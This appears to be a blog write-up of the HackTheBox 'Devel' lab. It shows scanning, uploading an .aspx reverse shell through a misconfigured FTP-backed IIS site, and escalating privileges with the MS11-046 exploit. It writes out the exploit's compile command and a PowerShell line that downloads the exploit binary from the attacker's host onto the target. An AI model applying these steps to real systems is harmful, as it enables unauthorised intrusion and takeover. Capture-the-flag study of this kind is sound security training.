---
title: "Devel"
date: 2023-07-03T17:35:59+02:00
tags: ["ftp","windows","web","IIS 7.5"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/Devel.png
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "This room is a windows room with a http service which runs iis7.5 web server which content is able at a misconfigured ftp service."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Devel
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Devel

![Untitled](/HTB/devel-icon.png)

## Tools Used

- Nmap
- FTP
- Searchsploit

## Port Scanning

As always the port scan first:

```bash
 sudo nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.10.10.5 -oN escaneo
```

![Untitled](/HTB/nmap-devel.png)

The scan results shows two open ports, the port 80 has an iis7 web server and the port 21 a ftp service with the content of the website, one folder named aspnet_client gives us a clue of what framework is using the website.

## Enumeration

![Untitled](/HTB/web-devel.png)

When I did a scan of directoies of the web I saw anything, then I start searching information of all
versions that were suporting the server and I found that there's one called IIS v7.5 that has multiple
vulnerabilities, also I found a dictionary of words for the wfuzz atack and I find some files now...

![Untitled](/HTB/whatweb-devel.png)

![Untitled](/HTB/iis-devel.png)

When I got stuck on the website I decided to continue with port 21 and establish an ftp connection to see 
what happened.

![Untitled](/HTB/ftp-devel.png)

I discovered that if I upload a file in html and then went to the web and do this -> `http://10.10.10.5/prueba.html`
it represents the file, :)

## Exploiting

Let’s exploit the machine

So I upload an exploit in **.aspx** and search it on the url and suprise we are in !!!

![Untitled](/HTB/url-devel.png)

![Untitled](/HTB/pwn-devel.png)

## Gaining an Initial Foothold

We are in now. Let’s see if we are root users or not.

![Untitled](/HTB/devel-1.png)

![Untitled](/HTB/devel-2.png)

If we try to enter in the users folder seems that we don’t have permissions.

![Untitled](/HTB/devel-3.png)

## Escalating Privilege

We can list the system information to see if we can escalate privileges.

![Untitled](/HTB/devel-4.png)

Our version is the Windows 7 build 7600 x86, it’s fairly old and no hotfix(s) are applied.


If we google it we can see a [exploit](https://www.exploit-db.com/exploits/40564) that fits well with what we want to do.

![Untitled](/HTB/devel-6.png)

![Untitled](/HTB/devel-7.png)

The exploit CVE-**[2011-1249](https://nvd.nist.gov/vuln/detail/CVE-2011-1249)** help us to escalate privileges.

Let’s download the exploit with searchsploit 

```bash
searchsploit -m "40564"
```

If we take a look to the documentation of the exploit we can see that the exploit need to be compiled with `mingw32` first.

```bash
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```
Options to upload the exploit to the windows machine:

- Now let’s create a http server with python to send this .exe.

  ```bash
   python -m http.server 80
  ```

  The remote machine doesn’t seems to have netcat but has powershell we can download the file with:

  ```bash
   powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.20:80/MS11-046.exe', 'c:\Users\Public\Downloads\40564.exe')"
  ```

  Once we have the exploit only left to run it, we can find it in c:\Users\Public\Downloads

- The second options, is to create smbserver with
  
  ```bash
   smbserver.py smbFolder /home/kali/HTB/devel -smb2support
  ```
  Then I connect with the windows machine and download the file and execute them ...  

  ![Untitled](/HTB/root-devel.png)

We have gained root access.

## Lessons Learned

- What insights did you gain from the room?
    
    We learned to put a reverse shell via the ftp service as well as escalate privilege with a exploit that take advantage of the afd.sys file.
    
- Were there any novel tools or techniques employed?
    
    We don’t employed any new tools but he know now a new format of reverse shell (aspx) that is employed by Microsoft [asp.net](http://asp.net).

**Thank you for reading, and happy hacking! 😄**
